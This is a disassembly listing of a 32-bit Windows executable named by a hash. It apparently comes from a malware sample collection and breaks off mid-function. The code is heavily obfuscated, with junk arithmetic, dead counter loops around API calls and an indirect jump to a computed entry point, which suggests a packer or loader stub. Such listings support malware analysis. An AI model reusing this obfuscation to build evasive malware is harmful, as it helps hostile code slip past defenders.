
10206acc89c607389aa4e6979c178ae38c84fa4d437fc629ffce7935b279ee82.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xcc
  401009:	xor    DWORD PTR ds:0x422014,0x420f98
  401013:	push   edi
  401014:	sub    DWORD PTR ds:0x420fb0,0x420e8e
  40101e:	push   0x424545
  401023:	xor    edi,edi
  401025:	and    DWORD PTR ds:0x420efc,0x110f
  40102f:	inc    edi
  401030:	push   edi
  401031:	sbb    DWORD PTR ds:0x420f08,0x51
  40103b:	push   edi
  40103c:	adc    DWORD PTR ds:0x422000,0x3888
  401046:	call   DWORD PTR ds:0x4247ed
  40104c:	test   eax,eax
  40104e:	mov    DWORD PTR ds:0x420e8a,0x96
  401058:	je     0x40106f
  40105e:	xor    eax,eax
  401060:	mov    DWORD PTR ds:0x420ef0,0x42a7
  40106a:	jmp    0x4020ba
  40106f:	push   esi
  401070:	sbb    DWORD PTR ds:0x420e96,ebx
  401076:	mov    esi,DWORD PTR ds:0x4247e9
  40107c:	push   0x8
  40107e:	and    DWORD PTR ds:0x420e96,0x420ef4
  401088:	push   0x424565
  40108d:	sbb    DWORD PTR ds:0x420fa8,0x2663
  401097:	call   esi
  401099:	mov    DWORD PTR ds:0x420f58,0x2539
  4010a3:	test   eax,eax
  4010a5:	mov    DWORD PTR ds:0x420f74,0x63dd
  4010af:	jne    0x401117
  4010b5:	push   0xc
  4010b7:	adc    DWORD PTR ds:0x420efc,0x422010
  4010c1:	push   0x424579
  4010c6:	call   esi
  4010c8:	sbb    DWORD PTR ds:0x422000,0x6696
  4010d2:	test   eax,eax
  4010d4:	jne    0x401117
  4010da:	xor    DWORD PTR ds:0x422010,0x3be2
  4010e4:	push   0x42458d
  4010e9:	adc    DWORD PTR ds:0x420fac,0x420fa0
  4010f3:	push   edi
  4010f4:	push   edi
  4010f5:	call   DWORD PTR ds:0x424819
  4010fb:	add    DWORD PTR ds:0x420e7e,0x14dc
  401105:	test   eax,eax
  401107:	mov    DWORD PTR ds:0x420f08,0x3170
  401111:	je     0x401128
  401117:	xor    eax,eax
  401119:	mov    DWORD PTR ds:0x422014,0x5c19
  401123:	jmp    0x4020b9
  401128:	sbb    esi,DWORD PTR ds:0x420e9a
  40112e:	mov    DWORD PTR [ebp-0x10],0x0
  401135:	and    edi,0x6e17
  40113b:	mov    eax,DWORD PTR [ebp-0x24]
  40113e:	mov    DWORD PTR [ebp-0x24],eax
  401141:	sub    esi,DWORD PTR ds:0x420fa0
  401147:	mov    ecx,0xf89c85b5
  40114c:	mov    DWORD PTR [ebp-0x8],ecx
  40114f:	sub    esi,DWORD PTR ds:0x420f00
  401155:	mov    DWORD PTR [ebp-0xc],0xf89c85b2
  40115c:	sbb    edx,DWORD PTR ds:0x420e92
  401162:	lea    eax,[ebp-0x38]
  401165:	mov    DWORD PTR [ebp-0x2c],eax
  401168:	adc    DWORD PTR ds:0x420f74,edi
  40116e:	lea    eax,[ebp-0x30]
  401171:	xor    esi,esi
  401173:	or     esi,DWORD PTR ds:0x420e9a
  401179:	and    DWORD PTR ds:0x420f64,esi
  40117f:	mov    DWORD PTR [ebp-0x1c],eax
  401182:	sbb    esi,eax
  401184:	mov    eax,ds:0x424435
  401189:	mov    edi,DWORD PTR ds:0x420f48
  40118f:	mov    edx,DWORD PTR ds:0x420f84
  401195:	sub    edx,edi
  401197:	sub    edi,DWORD PTR [edi+edx*1]
  40119a:	mov    eax,DWORD PTR [eax+0x1c8]
  4011a0:	mov    eax,DWORD PTR [eax]
  4011a2:	mov    edx,DWORD PTR [ebp-0x1c]
  4011a5:	movzx  edi,BYTE PTR ds:0x420fb4
  4011ac:	add    DWORD PTR ds:0x420e8a,edi
  4011b2:	mov    esi,0x7510896
  4011b7:	xor    eax,esi
  4011b9:	and    DWORD PTR ds:0x420fa0,0x420e96
  4011c3:	mov    edi,0x3272dd
  4011c8:	add    eax,edi
  4011ca:	mov    DWORD PTR [edx],eax
  4011cc:	mov    DWORD PTR ds:0x420ea2,0x7e11
  4011d6:	mov    eax,ds:0x424675
  4011db:	cmp    eax,0x312bc9f6
  4011e0:	mov    DWORD PTR ds:0x420fa4,0x3707
  4011ea:	jne    0x40133f
  4011f0:	mov    eax,DWORD PTR [ebp-0x8]
  4011f3:	mov    edx,DWORD PTR ds:0x424435
  4011f9:	mov    edx,DWORD PTR [edx+0x198]
  4011ff:	xor    eax,esi
  401201:	add    eax,edi
  401203:	add    DWORD PTR ds:0x422010,0x420eec
  40120d:	mov    DWORD PTR [edx],eax
  40120f:	and    DWORD PTR ds:0x42200c,0x0
  401219:	jmp    0x40122d
  40121e:	xor    edx,edx
  401220:	add    edx,DWORD PTR ds:0x42200c
  401226:	inc    edx
  401227:	mov    DWORD PTR ds:0x42200c,edx
  40122d:	cmp    DWORD PTR ds:0x42200c,0x12
  401234:	jae    0x401276
  40123a:	cmp    DWORD PTR ds:0x42200c,0x5
  401241:	jne    0x401255
  401247:	push   DWORD PTR [ebp-0x18]
  40124a:	push   0x450b
  40124f:	call   DWORD PTR ds:0x4247d5
  401255:	cmp    DWORD PTR ds:0x42200c,0x4
  40125c:	jne    0x401271
  401262:	xor    edx,edx
  401264:	add    edx,DWORD PTR ds:0x42200c
  40126a:	inc    edx
  40126b:	mov    DWORD PTR ds:0x42200c,edx
  401271:	jmp    0x40121e
  401276:	mov    eax,DWORD PTR [ebp-0x8]
  401279:	and    DWORD PTR ds:0x420f70,0x0
  401283:	mov    edx,DWORD PTR ds:0x420f70
  401289:	inc    edx
  40128a:	mov    DWORD PTR ds:0x420f70,edx
  401290:	cmp    DWORD PTR ds:0x420f70,0x7
  401297:	jne    0x4012b0
  40129d:	push   0x5d66
  4012a2:	push   0x420f60
  4012a7:	push   DWORD PTR [ebp-0x14]
  4012aa:	call   DWORD PTR ds:0x4247d9
  4012b0:	cmp    DWORD PTR ds:0x420f70,0x6
  4012b7:	jne    0x4012ca
  4012bd:	mov    edx,DWORD PTR ds:0x420f70
  4012c3:	inc    edx
  4012c4:	mov    DWORD PTR ds:0x420f70,edx
  4012ca:	cmp    DWORD PTR ds:0x420f70,0x14
  4012d1:	jb     0x401283
  4012d7:	and    edx,0x4d07
  4012dd:	xor    eax,esi
  4012df:	movzx  edx,BYTE PTR ds:0x420f08
  4012e6:	sub    edx,DWORD PTR ds:0x420fa0
  4012ec:	mov    DWORD PTR ds:0x420f08,edx
  4012f2:	add    eax,edi
  4012f4:	mov    DWORD PTR ds:0x422008,0x18
  4012fe:	cmp    DWORD PTR ds:0x422008,0x0
  401305:	je     0x40133a
  40130b:	cmp    DWORD PTR ds:0x422008,0x1d
  401312:	jne    0x401328
  401318:	push   0x42406a
  40131d:	push   0x424044
  401322:	call   DWORD PTR ds:0x4247dd
  401328:	mov    edx,DWORD PTR ds:0x422008
  40132e:	dec    edx
  40132f:	mov    DWORD PTR ds:0x422008,edx
  401335:	jmp    0x4012fe
  40133a:	mov    ds:0x424675,eax
  40133f:	mov    eax,ds:0x424435
  401344:	and    DWORD PTR ds:0x420ef4,0x0
  40134e:	mov    edx,DWORD PTR ds:0x420ef4
  401354:	inc    edx
  401355:	mov    DWORD PTR ds:0x420ef4,edx
  40135b:	cmp    DWORD PTR ds:0x420ef4,0x20
  401362:	jne    0x401379
  401368:	push   DWORD PTR [ebp-0x18]
  40136b:	push   0x222d
  401370:	push   DWORD PTR [ebp-0x28]
  401373:	call   DWORD PTR ds:0x4247e1
  401379:	cmp    DWORD PTR ds:0x420ef4,0x12
  401380:	jb     0x40134e
  401386:	mov    eax,DWORD PTR [eax+0x18c]
  40138c:	mov    eax,DWORD PTR [eax]
  40138e:	adc    DWORD PTR ds:0x422014,0x7308
  401398:	mov    DWORD PTR [ebp-0x68],eax
  40139b:	and    DWORD PTR ds:0x420e7e,0x0
  4013a5:	xor    eax,eax
  4013a7:	or     eax,DWORD PTR ds:0x420e7e
  4013ad:	inc    eax
  4013ae:	mov    ds:0x420e7e,eax
  4013b3:	cmp    DWORD PTR ds:0x420e7e,0xa
  4013ba:	jne    0x4013d1
  4013c0:	push   DWORD PTR [ebp-0x20]
  4013c3:	push   0x420f74
  4013c8:	push   DWORD PTR [ebp-0x28]
  4013cb:	call   DWORD PTR ds:0x4247e5
  4013d1:	cmp    DWORD PTR ds:0x420e7e,0x9
  4013d8:	jne    0x4013ec
  4013de:	xor    eax,eax
  4013e0:	xor    eax,DWORD PTR ds:0x420e7e
  4013e6:	inc    eax
  4013e7:	mov    ds:0x420e7e,eax
  4013ec:	cmp    DWORD PTR ds:0x420e7e,0x14
  4013f3:	jb     0x4013a5
  4013f9:	mov    DWORD PTR ds:0x420f04,0x16
  401403:	cmp    DWORD PTR ds:0x420f04,0x0
  40140a:	je     0x401438
  401410:	cmp    DWORD PTR ds:0x420f04,0x22
  401417:	jne    0x401423
  40141d:	call   DWORD PTR ds:0x4247f1
  401423:	xor    eax,eax
  401425:	or     eax,DWORD PTR ds:0x420f04
  40142b:	dec    eax
  40142c:	mov    ds:0x420f04,eax
  401431:	jmp    0x401403
  401436:	sub    edx,edx
  401438:	push   ebx
  401439:	or     eax,DWORD PTR ds:0x420f00
  40143f:	mov    ebx,0xf89c85b1
  401444:	and    DWORD PTR ds:0x420fa0,0x0
  40144e:	mov    edx,DWORD PTR ds:0x420fa0
  401454:	inc    edx
  401455:	mov    DWORD PTR ds:0x420fa0,edx
  40145b:	cmp    DWORD PTR ds:0x420fa0,0x8
  401462:	jne    0x40146e
  401468:	call   DWORD PTR ds:0x4247f5
  40146e:	cmp    DWORD PTR ds:0x420fa0,0x7
  401475:	jne    0x40148a
  40147b:	xor    edx,edx
  40147d:	xor    edx,DWORD PTR ds:0x420fa0
  401483:	inc    edx
  401484:	mov    DWORD PTR ds:0x420fa0,edx
  40148a:	cmp    DWORD PTR ds:0x420fa0,0x1e
  401491:	jb     0x40144e
  401497:	and    DWORD PTR ds:0x420e7a,0x0
  4014a1:	jmp    0x4014b3
  4014a6:	mov    edx,DWORD PTR ds:0x420e7a
  4014ac:	inc    edx
  4014ad:	mov    DWORD PTR ds:0x420e7a,edx
  4014b3:	cmp    DWORD PTR ds:0x420e7a,0x14
  4014ba:	jae    0x4014ff
  4014c0:	cmp    DWORD PTR ds:0x420e7a,0x1f
  4014c7:	jne    0x4014f0
  4014cd:	push   0x20c6
  4014d2:	push   DWORD PTR [ebp-0x10]
  4014d5:	push   0x420ea2
  4014da:	push   0x440c
  4014df:	push   DWORD PTR [ebp-0x20]
  4014e2:	push   0x7f92
  4014e7:	push   DWORD PTR [ebp-0x20]
  4014ea:	call   DWORD PTR ds:0x4247f9
  4014f0:	jmp    0x4014a6
  4014f5:	adc    DWORD PTR ds:0x420ea2,0x7cfc
  4014ff:	mov    DWORD PTR [ebp-0x10],ebx
  401502:	sub    DWORD PTR ds:0x420f5c,edi
  401508:	mov    DWORD PTR [ebp-0x10],ebx
  40150b:	mov    DWORD PTR ds:0x420f04,0x12
  401515:	cmp    DWORD PTR ds:0x420f04,0x0
  40151c:	je     0x40156b
  401522:	cmp    DWORD PTR ds:0x420f04,0x5
  401529:	jne    0x40153d
  40152f:	push   DWORD PTR [ebp-0x1c]
  401532:	push   0x424044
  401537:	call   DWORD PTR ds:0x4247fd
  40153d:	cmp    DWORD PTR ds:0x420f04,0x6
  401544:	jne    0x401557
  40154a:	mov    edx,DWORD PTR ds:0x420f04
  401550:	dec    edx
  401551:	mov    DWORD PTR ds:0x420f04,edx
  401557:	xor    edx,edx
  401559:	or     edx,DWORD PTR ds:0x420f04
  40155f:	dec    edx
  401560:	mov    DWORD PTR ds:0x420f04,edx
  401566:	jmp    0x401515
  40156b:	mov    DWORD PTR [ebp-0x10],ebx
  40156e:	and    DWORD PTR ds:0x422004,0x0
  401578:	jmp    0x40158c
  40157d:	xor    edx,edx
  40157f:	xor    edx,DWORD PTR ds:0x422004
  401585:	inc    edx
  401586:	mov    DWORD PTR ds:0x422004,edx
  40158c:	cmp    DWORD PTR ds:0x422004,0x12
  401593:	jae    0x4015bd
  401599:	cmp    DWORD PTR ds:0x422004,0x1e
  4015a0:	jne    0x4015b8
  4015a6:	push   0x424168
  4015ab:	push   0x1
  4015ad:	push   0x0
  4015af:	push   DWORD PTR [ebp-0x14]
  4015b2:	call   DWORD PTR ds:0x424801
  4015b8:	jmp    0x40157d
  4015bd:	mov    DWORD PTR [ebp-0x1c],ecx
  4015c0:	xor    edx,edx
  4015c2:	mov    DWORD PTR [ebp-0x10],ebx
  4015c5:	mov    DWORD PTR ds:0x420e96,0xb45
  4015cf:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  4015d6:	and    DWORD PTR ds:0x422014,0x2ed5
  4015e0:	mov    eax,DWORD PTR [ebp-0x8]
  4015e3:	mov    ecx,DWORD PTR [ebp-0xc]
  4015e6:	xor    edx,edx
  4015e8:	or     edx,DWORD PTR ds:0x420f60
  4015ee:	and    DWORD PTR ds:0x422000,edx
  4015f4:	mov    edx,DWORD PTR [ebp-0xc]
  4015f7:	sbb    DWORD PTR ds:0x420fa0,0x420fb4
  401601:	xor    edx,esi
  401603:	and    DWORD PTR ds:0x420f5c,0x420fa4
  40160d:	xor    ecx,esi
  40160f:	sub    DWORD PTR ds:0x422008,0x420f58
  401619:	add    ecx,edx
  40161b:	sbb    DWORD PTR ds:0x420e8e,edi
  401621:	mov    edx,DWORD PTR [ebp-0xc]
  401624:	xor    DWORD PTR ds:0x420f00,0x7b1e
  40162e:	xor    eax,esi
  401630:	xor    edx,esi
  401632:	or     DWORD PTR ds:0x420e9a,0x7d42
  40163c:	add    eax,edi
  40163e:	lea    ecx,[ecx+edx*1+0x975897]
  401645:	not    DWORD PTR ds:0x420f70
  40164b:	mov    DWORD PTR [ebp-0x18],eax
  40164e:	mov    DWORD PTR ds:0x420e7e,0x57b9
  401658:	cmp    eax,ecx
  40165a:	ja     0x40177e
  401660:	jmp    0x401678
  401665:	mov    eax,ds:0x420f30
  40166a:	mov    ecx,DWORD PTR ds:0x420f38
  401670:	sub    ecx,eax
  401672:	and    eax,DWORD PTR [eax+ecx*1]
  401675:	mov    eax,DWORD PTR [ebp-0x18]
  401678:	mov    ecx,DWORD PTR [ebp-0xc]
  40167b:	sub    DWORD PTR ds:0x422010,0x420f70
  401685:	xor    ecx,esi
  401687:	lea    eax,[ecx+eax*1+0x3272dd]
  40168e:	or     DWORD PTR ds:0x420f70,0x48c8
  401698:	push   eax
  401699:	sub    DWORD PTR ds:0x420e9e,0x506d
  4016a3:	mov    eax,DWORD PTR [ebp-0x1c]
  4016a6:	and    DWORD PTR ds:0x420f5c,0x3822
  4016b0:	xor    eax,esi
  4016b2:	xor    DWORD PTR ds:0x420f74,0x420ef0
  4016bc:	lea    eax,[ebp+eax*1+0x3272e5]
  4016c3:	or     DWORD PTR ds:0x420ea2,0x420f60
  4016cd:	push   eax
  4016ce:	or     DWORD PTR ds:0x420f00,0x5827
  4016d8:	mov    eax,ds:0x424435
  4016dd:	and    DWORD PTR ds:0x420fb4,0x420fa4
  4016e7:	push   DWORD PTR [eax+0x1bc]
  4016ed:	xor    DWORD PTR ds:0x420f98,0x420ea2
  4016f7:	call   0x4020cd
  4016fc:	add    DWORD PTR ds:0x420f68,0x6b04
  401706:	mov    eax,DWORD PTR [ebp-0xc]
  401709:	or     edx,DWORD PTR ds:0x420ef0
  40170f:	mov    ecx,DWORD PTR [ebp-0x18]
  401712:	neg    edx
  401714:	xor    eax,esi
  401716:	sub    edx,0x4f8d
  40171c:	lea    eax,[ecx+eax*1+0x3272dd]
  401723:	mov    ecx,DWORD PTR [ebp-0xc]
  401726:	xor    edx,DWORD PTR ds:0x420e7a
  40172c:	mov    edx,DWORD PTR [ebp-0xc]
  40172f:	xor    edx,esi
  401731:	add    DWORD PTR ds:0x420ef4,0x420e9e
  40173b:	xor    ecx,esi
  40173d:	adc    DWORD PTR ds:0x420e82,0x420f5c
  401747:	add    ecx,edx
  401749:	mov    edx,DWORD PTR [ebp-0xc]
  40174c:	xor    edx,esi
  40174e:	lea    ecx,[ecx+edx*1+0x975897]
  401755:	mov    DWORD PTR ds:0x420e82,0x59f5
  40175f:	mov    DWORD PTR [ebp-0x18],eax
  401762:	mov    DWORD PTR ds:0x420f98,0x3280
  40176c:	cmp    eax,ecx
  40176e:	mov    DWORD PTR ds:0x420fb4,0x7b83
  401778:	jbe    0x401665
  40177e:	and    DWORD PTR ds:0x420f98,0x0
  401788:	mov    ecx,DWORD PTR ds:0x420f98
  40178e:	inc    ecx
  40178f:	mov    DWORD PTR ds:0x420f98,ecx
  401795:	cmp    DWORD PTR ds:0x420f98,0x1e
  40179c:	jne    0x4017b2
  4017a2:	push   0x420fa0
  4017a7:	push   0x4d18
  4017ac:	call   DWORD PTR ds:0x424805
  4017b2:	cmp    DWORD PTR ds:0x420f98,0x18
  4017b9:	jb     0x401788
  4017bf:	mov    eax,DWORD PTR [ebp+0xc]
  4017c2:	sbb    DWORD PTR ds:0x420e7a,edx
  4017c8:	mov    ds:0x4242b9,eax
  4017cd:	and    DWORD PTR ds:0x420f74,0x0
  4017d7:	mov    eax,ds:0x420f74
  4017dc:	inc    eax
  4017dd:	mov    ds:0x420f74,eax
  4017e2:	cmp    DWORD PTR ds:0x420f74,0x1b
  4017e9:	jne    0x40180f
  4017ef:	push   DWORD PTR [ebp-0x1c]
  4017f2:	push   0x420f9c
  4017f7:	push   0x46e8
  4017fc:	push   0x4240e4
  401801:	push   0x1c79
  401806:	push   DWORD PTR [ebp-0xc]
  401809:	call   DWORD PTR ds:0x42480d
  40180f:	cmp    DWORD PTR ds:0x420f74,0x12
  401816:	jb     0x4017d7
  40181c:	mov    eax,DWORD PTR [ebp+0x10]
  40181f:	sub    ecx,DWORD PTR ds:0x420fa4
  401825:	mov    ds:0x42450d,eax
  40182a:	and    DWORD PTR ds:0x422010,0x0
  401834:	mov    eax,ds:0x422010
  401839:	inc    eax
  40183a:	mov    ds:0x422010,eax
  40183f:	cmp    DWORD PTR ds:0x422010,0x18
  401846:	jne    0x401852
  40184c:	call   DWORD PTR ds:0x424811
  401852:	cmp    DWORD PTR ds:0x422010,0x17
  401859:	jb     0x401834
  40185f:	add    ecx,ecx
  401861:	mov    eax,ds:0x4242b9
  401866:	or     DWORD PTR ds:0x420e7a,0x2e1b
  401870:	mov    ecx,DWORD PTR [ebp-0x2c]
  401873:	sub    eax,edi
  401875:	neg    DWORD PTR ds:0x420e92
  40187b:	xor    eax,esi
  40187d:	mov    DWORD PTR ds:0x420fac,0x2c59
  401887:	mov    DWORD PTR [ecx],eax
  401889:	mov    ecx,DWORD PTR [ebp-0x24]
  40188c:	mov    DWORD PTR ds:0x420efc,0x2f09
  401896:	mov    eax,0xf89c85b5
  40189b:	mov    DWORD PTR ds:0x420efc,0x2084
  4018a5:	cmp    ecx,eax
  4018a7:	jne    0x401be5
  4018ad:	xor    DWORD PTR ds:0x422014,0x4966
  4018b7:	lea    eax,[ebp-0x34]
  4018ba:	adc    DWORD PTR ds:0x420e8a,0x420e92
  4018c4:	mov    DWORD PTR [ebp-0x70],eax
  4018c7:	xor    DWORD PTR ds:0x420f74,0x422004
  4018d1:	lea    eax,[ebp+0x4]
  4018d4:	sub    DWORD PTR ds:0x420fa4,0x42200c
  4018de:	mov    DWORD PTR [ebp-0x34],eax
  4018e1:	mov    eax,DWORD PTR [ebp-0x34]
  4018e4:	test   eax,eax
  4018e6:	mov    DWORD PTR ds:0x420e82,0x6242
  4018f0:	je     0x40209d
  4018f6:	xor    DWORD PTR ds:0x422008,0x2d73
  401900:	mov    eax,DWORD PTR [ebp-0x20]
  401903:	mov    eax,DWORD PTR [ebp-0xc]
  401906:	mov    eax,DWORD PTR [ebp-0x8]
  401909:	adc    ecx,0x7834
  40190f:	mov    DWORD PTR [ebp+0xc],eax
  401912:	not    ecx
  401914:	mov    eax,eax
  401916:	mov    eax,ds:0x424435
  40191b:	and    DWORD PTR ds:0x422008,0x0
  401925:	mov    ecx,DWORD PTR ds:0x422008
  40192b:	inc    ecx
  40192c:	mov    DWORD PTR ds:0x422008,ecx
  401932:	cmp    DWORD PTR ds:0x422008,0x1e
  401939:	jne    0x40194a
  40193f:	push   0x422000
  401944:	call   DWORD PTR ds:0x424815
  40194a:	cmp    DWORD PTR ds:0x422008,0x1d
  401951:	jb     0x401925
  401957:	and    DWORD PTR ds:0x420fa0,0x0
  401961:	jmp    0x401973
  401966:	mov    ecx,DWORD PTR ds:0x420fa0
  40196c:	inc    ecx
  40196d:	mov    DWORD PTR ds:0x420fa0,ecx
  401973:	cmp    DWORD PTR ds:0x420fa0,0x14
  40197a:	jae    0x4019bc
  401980:	cmp    DWORD PTR ds:0x420fa0,0x5
  401987:	jne    0x40199d
  40198d:	push   0x2f20
  401992:	push   0x8e83
  401997:	call   DWORD PTR ds:0x4247d5
  40199d:	cmp    DWORD PTR ds:0x420fa0,0x4
  4019a4:	jne    0x4019b7
  4019aa:	mov    ecx,DWORD PTR ds:0x420fa0
  4019b0:	inc    ecx
  4019b1:	mov    DWORD PTR ds:0x420fa0,ecx
  4019b7:	jmp    0x401966
  4019bc:	mov    eax,DWORD PTR [eax+0x1c8]
  4019c2:	neg    DWORD PTR ds:0x420f98
  4019c8:	mov    eax,DWORD PTR [eax]
  4019ca:	sbb    DWORD PTR ds:0x420f74,ebx
  4019d0:	cdq    
  4019d1:	adc    DWORD PTR ds:0x42200c,0x4213
  4019db:	mov    ebx,eax
  4019dd:	mov    DWORD PTR ds:0x420fa4,0x17
  4019e7:	cmp    DWORD PTR ds:0x420fa4,0x0
  4019ee:	je     0x401a74
  4019f4:	cmp    DWORD PTR ds:0x420fa4,0x20
  4019fb:	jne    0x401a14
  401a01:	push   DWORD PTR [ebp-0x1c]
  401a04:	push   0x420e9a
  401a09:	push   0x6482
  401a0e:	call   DWORD PTR ds:0x4247d9
  401a14:	xor    eax,eax
  401a16:	or     eax,DWORD PTR ds:0x420fa4
  401a1c:	dec    eax
  401a1d:	mov    ds:0x420fa4,eax
  401a22:	jmp    0x4019e7
  401a27:	mov    DWORD PTR ds:0x420f08,0x1d
  401a31:	cmp    DWORD PTR ds:0x420f08,0x0
  401a38:	je     0x401a74
  401a3e:	cmp    DWORD PTR ds:0x420f08,0x1e
  401a45:	jne    0x401a5b
  401a4b:	push   0x424027
  401a50:	push   0x4240af
  401a55:	call   DWORD PTR ds:0x4247dd
  401a5b:	xor    eax,eax
  401a5d:	xor    eax,DWORD PTR ds:0x420f08
  401a63:	dec    eax
  401a64:	mov    ds:0x420f08,eax
  401a69:	jmp    0x401a31
  401a6e:	and    DWORD PTR ds:0x420e82,ebx
  401a74:	mov    eax,0xfabdbeed
  401a79:	add    ebx,eax
  401a7b:	inc    ecx
  401a7c:	adc    edx,0xffffffff
  401a7f:	mov    DWORD PTR ds:0x420fa0,0x16
  401a89:	cmp    DWORD PTR ds:0x420fa0,0x0
  401a90:	je     0x401b11
  401a96:	cmp    DWORD PTR ds:0x420fa0,0x20
  401a9d:	jne    0x401ab4
  401aa3:	push   DWORD PTR [ebp-0x10]
  401aa6:	push   0x1d23
  401aab:	push   DWORD PTR [ebp-0x1c]
  401aae:	call   DWORD PTR ds:0x4247e1
  401ab4:	xor    ecx,ecx
  401ab6:	xor    ecx,DWORD PTR ds:0x420fa0
  401abc:	dec    ecx
  401abd:	mov    DWORD PTR ds:0x420fa0,ecx
  401ac3:	jmp    0x401a89
  401ac8:	mov    DWORD PTR ds:0x42200c,0x1c
  401ad2:	cmp    DWORD PTR ds:0x42200c,0x0
  401ad9:	je     0x401b11
  401adf:	cmp    DWORD PTR ds:0x42200c,0x2c
  401ae6:	jne    0x401aff
  401aec:	push   0x87f3
  401af1:	push   0x420f68
  401af6:	push   DWORD PTR [ebp-0xc]
  401af9:	call   DWORD PTR ds:0x4247e5
  401aff:	mov    ecx,DWORD PTR ds:0x42200c
  401b05:	dec    ecx
  401b06:	mov    DWORD PTR ds:0x42200c,ecx
  401b0c:	jmp    0x401ad2
  401b11:	and    DWORD PTR [ebp-0x10],0x0
  401b15:	sbb    DWORD PTR ds:0x422014,ebx
  401b1b:	xor    edx,0x0
  401b1e:	xor    ecx,DWORD PTR ds:0x420f70
  401b24:	mov    DWORD PTR [ebp-0x54],edx
  401b27:	adc    ecx,edx
  401b29:	mov    edx,DWORD PTR [ebp+0xc]
  401b2c:	mov    DWORD PTR [ebp-0x14],edx
  401b2f:	mov    ecx,0x8a29a127
  401b34:	xor    ebx,ecx
  401b36:	dec    edx
  401b37:	add    DWORD PTR [ebp-0x14],eax
  401b3a:	mov    DWORD PTR ds:0x420e96,edi
  401b40:	mov    edx,DWORD PTR [ebp-0x14]
  401b43:	adc    DWORD PTR [ebp-0x10],0xffffffff
  401b47:	or     DWORD PTR ds:0x420f6c,0x420f00
  401b51:	xor    edx,ecx
  401b53:	add    DWORD PTR ds:0x420e86,0x420f04
  401b5d:	mov    DWORD PTR [ebp-0x4c],edx
  401b60:	mov    edx,DWORD PTR [ebp-0x10]
  401b63:	xor    edx,0x0
  401b66:	mov    DWORD PTR [ebp-0x48],edx
  401b69:	mov    DWORD PTR ds:0x420efc,0x3c82
  401b73:	cmp    DWORD PTR [ebp-0x4c],ebx
  401b76:	jne    0x401b92
  401b7c:	mov    DWORD PTR ds:0x420e92,0x5ff4
  401b86:	mov    edx,DWORD PTR [ebp-0x54]
  401b89:	cmp    DWORD PTR [ebp-0x48],edx
  401b8c:	je     0x401bc1
  401b92:	mov    edx,DWORD PTR ds:0x424435
  401b98:	mov    edx,DWORD PTR [edx+0x1c0]
  401b9e:	mov    edx,DWORD PTR [edx]
  401ba0:	xor    ebx,ebx
  401ba2:	add    edx,eax
  401ba4:	adc    ebx,0xffffffff
  401ba7:	xor    edx,ecx
  401ba9:	xor    ebx,0x0
  401bac:	cmp    edx,0x70941fc9
  401bb2:	jne    0x40209d
  401bb8:	cmp    ebx,0xffffffff
  401bbb:	jne    0x40209d
  401bc1:	mov    edx,DWORD PTR ds:0x4244b1
  401bc7:	mov    ebx,DWORD PTR ds:0x4244b9
  401bcd:	xor    edx,ebx
  401bcf:	mov    DWORD PTR ds:0x4244b1,edx
  401bd5:	mov    ebx,DWORD PTR ds:0x4244b1
  401bdb:	mov    edx,DWORD PTR [ebp-0x34]
  401bde:	add    DWORD PTR [edx],ebx
  401be0:	jmp    0x40205e
  401be5:	mov    ecx,DWORD PTR [ebp-0x38]
  401be8:	cmp    ecx,0xf89c85b2
  401bee:	je     0x401c4b
  401bf4:	mov    ecx,DWORD PTR [ebp-0x8]
  401bf7:	mov    edx,DWORD PTR [ebp-0x30]
  401bfa:	xor    ecx,esi
  401bfc:	add    ecx,edi
  401bfe:	cmp    ecx,edx
  401c00:	je     0x401c4b
  401c06:	mov    eax,ds:0x424435
  401c0b:	mov    eax,DWORD PTR [eax+0x194]
  401c11:	mov    ecx,DWORD PTR [eax]
  401c13:	mov    eax,DWORD PTR [ecx+0x3c]
  401c16:	push   DWORD PTR ds:0x42450d
  401c1c:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  401c20:	push   DWORD PTR ds:0x4242b9
  401c26:	add    eax,ecx
  401c28:	mov    ecx,DWORD PTR ds:0x424435
  401c2e:	mov    ecx,DWORD PTR [ecx+0x194]
  401c34:	push   DWORD PTR [ecx]
  401c36:	call   eax
  401c38:	mov    ecx,DWORD PTR ds:0x424435
  401c3e:	mov    ecx,DWORD PTR [ecx+0x1cc]
  401c44:	mov    DWORD PTR [ecx],eax
  401c46:	jmp    0x40209d
  401c4b:	mov    ecx,DWORD PTR [ebp-0x8]
  401c4e:	mov    edx,DWORD PTR [ebp-0x68]
  401c51:	xor    ecx,esi
  401c53:	add    ecx,edi
  401c55:	cmp    ecx,edx
  401c57:	jne    0x401f61
  401c5d:	mov    ecx,DWORD PTR [ebp-0x8]
  401c60:	mov    edx,DWORD PTR ds:0x424435
  401c66:	mov    edx,DWORD PTR [edx+0x198]
  401c6c:	xor    ecx,esi
  401c6e:	add    ecx,edi
  401c70:	cmp    ecx,DWORD PTR [edx]
  401c72:	jne    0x401c8d
  401c78:	push   eax
  401c79:	mov    eax,DWORD PTR [ebp-0x8]
  401c7c:	xor    eax,esi
  401c7e:	add    eax,edi
  401c80:	push   eax
  401c81:	push   ebx
  401c82:	push   DWORD PTR [ebp-0xc]
  401c85:	push   DWORD PTR [ebp-0x8]
  401c88:	call   0x40772b
  401c8d:	mov    eax,DWORD PTR [ebp-0xc]
  401c90:	mov    DWORD PTR [ebp-0x3c],eax
  401c93:	mov    eax,DWORD PTR [ebp-0x8]
  401c96:	mov    DWORD PTR [ebp-0x18],eax
  401c99:	mov    eax,DWORD PTR [ebp-0x18]
  401c9c:	xor    eax,esi
  401c9e:	add    eax,edi
  401ca0:	mov    DWORD PTR [ebp+0x10],eax
  401ca3:	mov    eax,ds:0x4242b5
  401ca8:	mov    eax,DWORD PTR [eax]
  401caa:	mov    DWORD PTR [ebp+0x10],eax
  401cad:	mov    eax,ds:0x4244bd
  401cb2:	mov    eax,DWORD PTR [eax]
  401cb4:	mov    DWORD PTR [ebp-0x1c],eax
  401cb7:	mov    DWORD PTR [ebp+0xc],0xf89c87b5
  401cbe:	mov    eax,DWORD PTR [ebp+0xc]
  401cc1:	xor    eax,esi
  401cc3:	add    eax,edi
  401cc5:	mov    DWORD PTR [ebp+0xc],eax
  401cc8:	mov    eax,ds:0x424435
  401ccd:	mov    DWORD PTR [ebp+0xc],eax
  401cd0:	mov    eax,DWORD PTR [ebp+0x10]
  401cd3:	mov    DWORD PTR [ebp+0xc],eax
  401cd6:	mov    eax,DWORD PTR [ebp+0xc]
  401cd9:	push   0x4
